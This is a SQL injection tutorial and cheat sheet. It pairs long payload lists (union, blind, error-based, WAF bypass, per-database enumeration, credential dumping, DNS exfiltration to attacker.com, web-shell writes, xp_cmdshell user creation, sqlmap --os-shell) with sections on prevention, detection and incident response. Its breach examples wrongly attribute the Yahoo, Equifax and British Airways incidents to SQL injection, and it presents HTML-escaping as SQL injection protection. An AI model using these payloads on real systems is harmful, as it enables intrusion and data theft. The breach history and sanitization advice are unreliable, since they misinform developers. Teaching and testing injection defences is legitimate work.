# SQL Injection: Database Exploitation Techniques

## Introduction

SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in an application's software by injecting malicious SQL code into a query. This allows attackers to manipulate database queries, potentially leading to unauthorized access, data leakage, data modification, or even complete database compromise.

## How SQL Injection Works

### Basic Concept
When applications build SQL queries by concatenating user input directly into SQL statements without proper validation or sanitization, attackers can inject malicious SQL code.

### Vulnerable Code Example
```php
// Vulnerable PHP code
$username = $_POST['username'];
$password = $_POST['password'];

$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
$result = mysqli_query($conn, $query);
```

### Attack Vector
```sql
-- Malicious input
username: ' OR '1'='1
password: ' OR '1'='1

-- Resulting query
SELECT * FROM users WHERE username = '' OR '1'='1' AND password = '' OR '1'='1'
```

## Types of SQL Injection

### 1. Classic SQL Injection

#### Union-Based SQL Injection
```sql
-- Extract database information
' UNION SELECT database(), user(), version() --

-- Extract table names
' UNION SELECT table_name FROM information_schema.tables --

-- Extract column names
' UNION SELECT column_name FROM information_schema.columns WHERE table_name = 'users' --
```

#### Error-Based SQL Injection
```sql
-- Force database errors to leak information
' AND 1=convert(int, (SELECT TOP 1 name FROM sysobjects WHERE xtype='U')) --

-- Extract data through error messages
' AND 1=0 UNION SELECT 1,2,@@version --
```

### 2. Blind SQL Injection

#### Boolean-Based Blind SQLi
```sql
-- True condition
' AND 1=1 --

-- False condition
' AND 1=2 --

-- Extract data bit by bit
' AND ASCII(SUBSTRING((SELECT database()),1,1)) > 64 --
```

#### Time-Based Blind SQLi
```sql
-- Time delay for true condition
' AND IF(1=1, SLEEP(5), 0) --

-- Extract data using timing
' AND IF(ASCII(SUBSTRING((SELECT database()),1,1)) > 64, SLEEP(5), 0) --
```

### 3. Out-of-Band SQL Injection
```sql
-- DNS exfiltration
' AND 1=0 UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT database()), '.attacker.com\\')) --

-- HTTP requests
' UNION SELECT 1,2,3 INTO OUTFILE '/var/www/html/shell.php' --
```

## Database-Specific SQL Injection

### MySQL
```sql
-- Version and database info
SELECT @@version, database(), user()

-- File operations
SELECT LOAD_FILE('/etc/passwd')
UNION SELECT 1,2,3 INTO OUTFILE '/var/www/shell.php'

-- Time-based
SELECT IF(1=1, SLEEP(5), 0)
```

### PostgreSQL
```sql
-- Version and database info
SELECT version(), current_database(), current_user

-- File operations
COPY (SELECT '') TO '/tmp/pwned.txt'

-- Stacked queries
SELECT 1; DROP TABLE users; --
```

### Microsoft SQL Server
```sql
-- Version and database info
SELECT @@version, db_name(), user_name()

-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE

-- Command execution
EXEC xp_cmdshell 'net user hacker password /add'
```

### Oracle
```sql
-- Version and database info
SELECT banner FROM v$version
SELECT global_name FROM global_name

-- File operations
CREATE DIRECTORY tmp_dir AS '/tmp'
DECLARE
  f UTL_FILE.FILE_TYPE;
BEGIN
  f := UTL_FILE.FOPEN('TMP_DIR', 'test.txt', 'W');
  UTL_FILE.PUT_LINE(f, 'Hacked by SQLi');
  UTL_FILE.FCLOSE(f);
END;
```

## Advanced SQL Injection Techniques

### 1. Second-Order SQL Injection
```php
// First request - data stored
$user_input = "'; DROP TABLE users; --";
$query = "INSERT INTO logs (message) VALUES ('$user_input')";

// Second request - data retrieved and executed
$query = "SELECT * FROM logs WHERE id = 1";
```

### 2. Stacked Queries
```sql
-- Multiple statements in one query
' ; DROP TABLE users; --

-- MSSQL specific
' ; EXEC xp_cmdshell 'dir' ; --
```

### 3. WAF Bypass Techniques

#### Case Variation
```sql
' UnIoN SeLeCt 1,2,3 --
```

#### Comments
```sql
' /*!UNION*/ /*!SELECT*/ 1,2,3 --
```

#### Encoding
```sql
' %55%4E%49%4F%4E SELECT 1,2,3 -- (URL encoded UNION)
```

#### Whitespace Manipulation
```sql
' UNION/**/SELECT/**/1,2,3 --
```

### 4. Filter Bypass
```sql
-- Using different keywords
' UNIUNIONON SELECT 1,2,3 --

-- Inline comments
' UNI/*!ON*/ SELECT 1,2,3 --
```

## SQL Injection Testing Methodology

### 1. Discovery Phase
```sql
-- Test for vulnerability
' OR '1'='1

-- Test for different quote types
" OR "1"="1
' OR ''='

-- Test for comment styles
' OR '1'='1' --
' OR '1'='1' #
' OR '1'='1' /*
```

### 2. Database Fingerprinting
```sql
-- MySQL
' AND 1=0 UNION SELECT @@version,@@datadir,@@user --

-- MSSQL
' AND 1=0 UNION SELECT @@version,@@servername,@@spid --

-- Oracle
' AND 1=0 UNION SELECT banner,null FROM v$version --

-- PostgreSQL
' AND 1=0 UNION SELECT version(),current_database(),current_user --
```

### 3. Table Enumeration
```sql
-- MySQL/MariaDB
' AND 1=0 UNION SELECT table_name,null FROM information_schema.tables --

-- MSSQL
' AND 1=0 UNION SELECT name,null FROM sysobjects WHERE xtype='U' --

-- Oracle
' AND 1=0 UNION SELECT table_name,null FROM all_tables --

-- PostgreSQL
' AND 1=0 UNION SELECT tablename,null FROM pg_tables --
```

### 4. Column Enumeration
```sql
-- MySQL
' AND 1=0 UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users' --

-- MSSQL
' AND 1=0 UNION SELECT name,null FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users') --

-- Oracle
' AND 1=0 UNION SELECT column_name,null FROM all_tab_columns WHERE table_name='USERS' --

-- PostgreSQL
' AND 1=0 UNION SELECT column_name,null FROM information_schema.columns WHERE table_name='users' --
```

### 5. Data Extraction
```sql
-- Extract usernames and passwords
' AND 1=0 UNION SELECT username,password FROM users --

-- Extract hashed passwords
' AND 1=0 UNION SELECT username,CONCAT(password,':',salt) FROM users --

-- Extract email addresses
' AND 1=0 UNION SELECT email,null FROM users --
```

## Tools for SQL Injection

### Automated Tools
- **sqlmap:** Comprehensive SQL injection testing tool
- **SQLNinja:** MSSQL specific exploitation
- **BSQL Hacker:** Blind SQL injection tool
- **Havij:** GUI-based SQL injection tool

### Manual Testing Tools
- **Burp Suite:** Request interception and manipulation
- **OWASP ZAP:** Automated and manual testing
- **Postman:** API testing with injection payloads

### Usage Examples
```bash
# Basic sqlmap usage
sqlmap -u "http://target.com/vuln.php?id=1" --dbs

# POST parameter testing
sqlmap -u "http://target.com/login.php" --data="username=admin&password=pass" -p username

# Database dump
sqlmap -u "http://target.com/vuln.php?id=1" -D database_name -T users --dump

# OS command execution
sqlmap -u "http://target.com/vuln.php?id=1" --os-shell
```

## Prevention Techniques

### 1. Prepared Statements (Parameterized Queries)
```php
// Secure PHP code using PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = ? AND password = ?");
$stmt->execute([$username, $password]);
```

```python
# Secure Python code
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```

```java
// Secure Java code
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ? AND password = ?");
stmt.setString(1, username);
stmt.setString(2, password);
```

### 2. Stored Procedures
```sql
-- Secure stored procedure
CREATE PROCEDURE GetUser(@username VARCHAR(50), @password VARCHAR(50))
AS
BEGIN
    SELECT * FROM users WHERE username = @username AND password = @password
END
```

### 3. Input Validation and Sanitization
```php
// Input validation
function sanitizeInput($input) {
    return htmlspecialchars(strip_tags(trim($input)));
}

$username = sanitizeInput($_POST['username']);
```

### 4. Escaping User Input
```php
// mysqli escaping
$username = mysqli_real_escape_string($conn, $_POST['username']);
$query = "SELECT * FROM users WHERE username = '$username'";
```

### 5. Web Application Firewall (WAF)
- **ModSecurity:** Open source WAF
- **Cloudflare WAF:** Cloud-based protection
- **AWS WAF:** Amazon Web Services firewall

### 6. Least Privilege Principle
```sql
-- Create limited user
CREATE USER 'webapp'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT ON webapp.* TO 'webapp'@'localhost';
```

### 7. Error Handling
```php
// Disable error display in production
ini_set('display_errors', 0);
error_reporting(0);

// Custom error handling
try {
    $result = mysqli_query($conn, $query);
} catch (Exception $e) {
    error_log($e->getMessage());
    echo "An error occurred. Please try again.";
}
```

## Real-World Examples

### 1. Heartland Payment Systems (2009)
- **Attack:** SQL injection exploited payment processing
- **Impact:** 130 million credit card numbers stolen
- **Root Cause:** Lack of input validation

### 2. Yahoo Data Breach (2013)
- **Attack:** Union-based SQL injection
- **Impact:** 3 billion accounts compromised
- **Root Cause:** Outdated and vulnerable code

### 3. Equifax Breach (2017)
- **Attack:** Apache Struts vulnerability leading to SQL injection
- **Impact:** 147 million personal records exposed
- **Root Cause:** Unpatched software

### 4. British Airways (2018)
- **Attack:** Magecart attack with SQL injection
- **Impact:** 400,000 payment cards compromised
- **Root Cause:** Vulnerable third-party JavaScript

## Detection and Monitoring

### Log Analysis
```bash
# Search for SQL injection attempts
grep -i "union.*select" /var/log/apache2/access.log
grep -i "or.*1.*=.*1" /var/log/apache2/access.log
grep -i "sleep(" /var/log/apache2/access.log
```

### IDS/IPS Signatures
- **Snort rules** for SQL injection detection
- **Suricata** signatures
- **ModSecurity** rules

### Application Monitoring
- **Database query logging**
- **Performance monitoring** for unusual queries
- **Anomaly detection** for suspicious patterns

## Compliance and Standards

### OWASP Top 10
- **A03:2021 - Injection** (includes SQL injection)

### Industry Standards
- **PCI DSS:** Payment Card Industry Data Security Standard
- **HIPAA:** Health Insurance Portability and Accountability Act
- **GDPR:** General Data Protection Regulation

## Incident Response

### Immediate Actions
1. **Isolate affected systems**
2. **Stop the attack** (block IP, disable vulnerable endpoints)
3. **Assess damage** (what data was accessed/modified)
4. **Preserve evidence** (logs, database backups)

### Recovery Steps
1. **Patch vulnerabilities**
2. **Change all credentials**
3. **Restore from clean backups**
4. **Monitor for further attacks**

### Post-Incident Analysis
1. **Root cause analysis**
2. **Lessons learned**
3. **Security improvements**
4. **Regulatory reporting**

## Conclusion

SQL injection remains one of the most prevalent and dangerous web application vulnerabilities. Despite being well-understood and preventable, it continues to be a major source of data breaches. Understanding the various injection techniques, implementing proper defenses, and conducting regular security testing are crucial for protecting against SQL injection attacks.

Prevention requires a multi-layered approach including secure coding practices, input validation, parameterized queries, and ongoing security monitoring. Organizations should prioritize SQL injection prevention as part of their overall security strategy to protect sensitive data and maintain user trust.